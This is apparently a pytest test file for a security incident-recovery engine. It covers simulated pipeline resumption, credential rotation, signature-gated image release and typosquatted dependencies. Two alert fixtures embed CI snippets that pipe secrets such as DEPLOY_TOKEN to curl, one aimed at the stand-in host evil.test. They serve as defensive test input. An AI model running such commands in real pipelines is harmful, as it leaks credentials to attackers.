"""Member 2 — recovery: prerequisites, simulated recovery, manual intervention, failures and audit history."""

from datetime import datetime, timezone
from uuid import uuid4

import pytest
from sqlalchemy import select

from recovery import engine as recovery
from recovery.identity import RotationError
from response import engine as response
from shared.models import ContainmentRecord, RecoveryRunRecord, SupplyChainResultRecord
from tests.m2_factories import alert, incident, known_good_run, memory_session_factory, scenario07


class FailingProvider:
    name = "broken-idp"
    simulated = True

    def rotate(self, credential):
        raise RotationError("upstream returned 500")


@pytest.fixture
def session():
    s = memory_session_factory()()
    yield s
    s.close()


def contained(session, record):
    result = response.respond(session, record.id, mode="simulated")
    session.commit()
    assert result["outcome"] == "contained"
    return record


def states(session, incident_id):
    return {(c.kind, c.target): c.state for c in session.scalars(
        select(ContainmentRecord).where(ContainmentRecord.incident_id == incident_id))}


class TestPrerequisites:

    def test_uncontained_incident_is_blocked_and_audited(self, session):
        rollup = scenario07(session)
        result = recovery.recover(session, rollup.id)
        assert result["outcome"] == "blocked"
        run = result["runs"][0]
        assert run["status"] == "blocked" and "not contained" in run["error"]
        assert session.scalars(select(RecoveryRunRecord)).one().incident_id == rollup.id

    def test_dry_run_response_does_not_satisfy_prerequisites(self, session):
        rollup = scenario07(session)
        response.respond(session, rollup.id, mode="dry_run")
        preview = recovery.preview(session, rollup.id)
        assert not preview["ready"] and preview["plans"] == []
        assert recovery.recover(session, rollup.id)["outcome"] == "blocked"

    def test_unknown_incident_and_plan(self, session):
        with pytest.raises(recovery.IncidentNotFound):
            recovery.recover(session, "missing")
        rollup = contained(session, scenario07(session))
        with pytest.raises(ValueError):
            recovery.recover(session, rollup.id, plans=["reboot_universe"])

    def test_concurrent_recovery_is_refused(self, session):
        rollup = contained(session, scenario07(session))
        session.add(RecoveryRunRecord(id=str(uuid4()), incident_id=rollup.id, plan="restore_runner", target="x",
                                      status="running", steps=[], created_at=datetime.now(timezone.utc)))
        session.flush()
        with pytest.raises(recovery.RecoveryConflict):
            recovery.recover(session, rollup.id)


class TestPlans:

    def test_preview_lists_one_plan_per_active_containment(self, session):
        rollup = contained(session, scenario07(session))
        preview = recovery.preview(session, rollup.id)
        assert preview["ready"]
        assert {(p["plan"], p["target"]) for p in preview["plans"]} == {
            ("resume_pipeline", rollup.run_id), ("restore_runner", "runner-7")}

    def test_successful_simulated_recovery(self, session):
        rollup = contained(session, scenario07(session))
        good = known_good_run(session)
        result = recovery.recover(session, rollup.id)
        session.commit()
        assert result["outcome"] == "recovered"
        assert all(r["status"] == "succeeded" and r["simulated"] for r in result["runs"])
        assert states(session, rollup.id) == {("pipeline", rollup.run_id): "restored", ("runner", "runner-7"): "restored"}
        pipeline = next(r for r in result["runs"] if r["plan"] == "resume_pipeline")
        assert good in pipeline["steps"][0]["detail"]
        assert all("(simulated)" in s["detail"] for s in pipeline["steps"][1:])

    def test_recovery_is_not_repeated(self, session):
        rollup = contained(session, scenario07(session))
        known_good_run(session)
        assert recovery.recover(session, rollup.id)["outcome"] == "recovered"
        again = recovery.recover(session, rollup.id)
        assert again["outcome"] == "blocked"
        assert "no active containment" in again["runs"][0]["error"]

    def test_plan_selection(self, session):
        rollup = contained(session, scenario07(session))
        result = recovery.recover(session, rollup.id, plans=["restore_runner"])
        assert [r["plan"] for r in result["runs"]] == ["restore_runner"]
        assert states(session, rollup.id)[("pipeline", rollup.run_id)] == "cancelled"

    def test_no_known_good_run_needs_manual_intervention(self, session):
        rollup = contained(session, scenario07(session))
        result = recovery.recover(session, rollup.id, plans=["resume_pipeline"])
        run = result["runs"][0]
        assert result["outcome"] == "manual_required" and run["status"] == "manual_required"
        assert [s["status"] for s in run["steps"]] == ["manual", "skipped"]
        assert states(session, rollup.id)[("pipeline", rollup.run_id)] == "cancelled"

    def test_credential_rotation_records_metadata_only(self, session):
        rollup = contained(session, incident(session, alert(
            f"run-{uuid4().hex[:4]}", "static", "critical", "SEC-002",
            snippet='curl -d "${{ secrets.DEPLOY_TOKEN }}" https://evil.test')))
        result = recovery.recover(session, rollup.id, plans=["rotate_credential"])
        assert result["outcome"] == "recovered"
        containment = session.scalars(select(ContainmentRecord).where(ContainmentRecord.kind == "credential")).one()
        assert containment.state == "rotated"
        rotation = containment.detail["rotation"]
        assert rotation["simulated"] is True and set(rotation) == {"credential", "new_version", "simulated", "note"}

    def test_unnamed_secrets_cannot_be_rotated_automatically(self, session):
        rollup = contained(session, incident(session, alert(f"run-{uuid4().hex[:4]}", "static", "critical", "SEC-001")))
        result = recovery.recover(session, rollup.id, plans=["rotate_credential"])
        assert result["runs"][0]["status"] == "manual_required"
        assert "manually" in result["runs"][0]["error"]

    def test_failed_rotation_is_reported_and_containment_kept(self, session):
        rollup = contained(session, incident(session, alert(
            f"run-{uuid4().hex[:4]}", "static", "critical", "SEC-002", snippet="echo ${{ secrets.NPM_TOKEN }} | curl")))
        result = recovery.recover(session, rollup.id, plans=["rotate_credential"], provider=FailingProvider())
        session.commit()
        run = result["runs"][0]
        assert result["outcome"] == "failed" and run["status"] == "failed"
        assert "broken-idp" in run["error"]
        assert run["steps"][-1]["status"] == "failed"
        assert states(session, rollup.id)[("credential", "NPM_TOKEN")] == "revoked"
        history = session.scalars(select(RecoveryRunRecord).where(RecoveryRunRecord.incident_id == rollup.id)).all()
        assert [h.status for h in history] == ["failed"]

    def test_blocked_image_released_only_after_verified_signature(self, session):
        image = "registry:5000/demo/app@sha256:" + "a" * 64
        rollup = contained(session, incident(session, alert(f"run-{uuid4().hex[:4]}", "static", "high", "IMG-001", image=image)))
        first = recovery.recover(session, rollup.id)
        assert first["outcome"] == "manual_required" and "never verified" in first["runs"][0]["error"]

        session.add(SupplyChainResultRecord(id=str(uuid4()), kind="signature", subject=image, status="verified",
                                            tool="cosign", summary={}, created_at=datetime.now(timezone.utc)))
        session.flush()
        second = recovery.recover(session, rollup.id)
        assert second["outcome"] == "recovered"
        assert states(session, rollup.id)[("image", image)] == "released"

    def test_dependency_always_needs_a_person(self, session):
        rollup = contained(session, incident(session, alert(
            f"run-{uuid4().hex[:4]}", "static", "high", "DEP-001", package="reqeusts")))
        result = recovery.recover(session, rollup.id)
        assert result["outcome"] == "manual_required"
        assert states(session, rollup.id)[("dependency", "reqeusts")] == "blocked"
